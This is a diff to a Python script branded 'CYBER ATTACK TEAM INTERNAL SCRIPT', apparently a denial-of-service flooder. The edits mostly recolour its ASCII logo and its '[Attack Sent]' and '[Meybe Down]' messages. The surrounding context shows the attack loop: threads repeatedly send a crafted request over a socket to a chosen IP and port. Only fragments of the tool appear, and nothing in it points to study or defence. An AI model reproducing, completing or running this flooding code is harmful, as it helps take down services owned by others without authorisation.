@@ -15,19 +15,19 @@ os.system("clear")
 
 logo = """ 
           ██▒██▒██▒▒             ██▒▒        ██▒██▒██▒██▒██▒▒
-       ██▒▒                    ██▒▒██▒▒        ▒▒▒▒██▒▒▒▒▒▒
-      ██▒▒                    ██▒▒  ██▒▒        ▒▒ ██▒▒ ▒▒
-      ██▒▒                   ██▒▒    ██▒▒         ▒██▒▒   ▒
-      ██▒▒                  ██▒▒      ██▒▒         ██▒▒
+       ██▒▒▒▒▒▒▒▒▒▒           ██▒▒██▒▒        ▒▒▒▒██▒▒▒▒▒▒
+      ██▒▒ ▒▒▒▒▒▒            ██▒▒  ██▒▒        ▒▒ ██▒▒ ▒▒
+      ██▒▒   ▒▒▒            ██▒▒    ██▒▒         ▒██▒▒   ▒
+      ██▒▒    ▒            ██▒▒      ██▒▒         ██▒▒
       ██▒▒                 ██▒▒        ██▒▒        ██▒▒
       ██▒▒                ██▒▒ ██▒██▒██▒██▒▒       ██▒▒
        ██▒▒              ██▒▒            ██▒▒      ██▒▒       
           ██▒██▒██▒▒    ██▒▒              ██▒▒     ██▒▒           
-          ▒▒▒▒▒▒▒▒▒     ▒▒▒▒              ▒▒▒▒   ▒▒▒▒
-           ▒▒▒▒▒▒▒       ▒▒▒               ▒▒▒     ▒▒
-            ▒▒▒▒▒         ▒▒                 ▒▒     ▒
-             ▒▒▒          ▒▒                 ▒       ▒
-            ▒▒            ▒                   ▒      ▒
+          ▒▒▒▒▒▒▒▒▒     ▒▒▒▒              ▒▒▒▒     ▒▒▒▒
+           ▒▒▒▒▒▒▒       ▒▒▒               ▒▒▒       ▒▒
+            ▒▒▒▒▒         ▒▒                ▒▒        ▒
+             ▒▒▒          ▒▒                 ▒        ▒
+              ▒▒            ▒                   ▒        ▒
 \033[37m              C Y B E R   A T T A C K   T E A M 
 \033[37m                I N T E R N A L   S C R I P T      
 \033[33m                       Design By: KF24
@@ -102,11 +102,12 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[33m[★\033[33m]  \033[33m[CAT]  \033[37m[Attack Sent]  \033[36m{0}:{1}  \033[34m{2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[94m[★\033[94m] [CAT]  \033[95m[Attack Sent]  \033[96m{0}:{1}  \033[34m{2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[33m[★\033[33m] [CAT]  \033[31m[Attack Sent]  \033[34m{0}:{1}  \033[34m{2}\033[0m".format(str(ip), int(port), xx))
                 
         except:
                 s.close()
-                print("[x]  \033[33m[CAT]  \033[37m[Meybe Down]  \033[36m{0}:{1}  \033[37m{2}\033[0m".format(str(ip), int(port), xx))
+                print("[x]  \033[35m[CAT]  \033[34m[Meybe Down]  \033[36m{0}:{1}  \033[37m{2}\033[0m".format(str(ip), int(port), xx))
                     
 for x in range(thread):
     thred = threading.Thread(target=start)
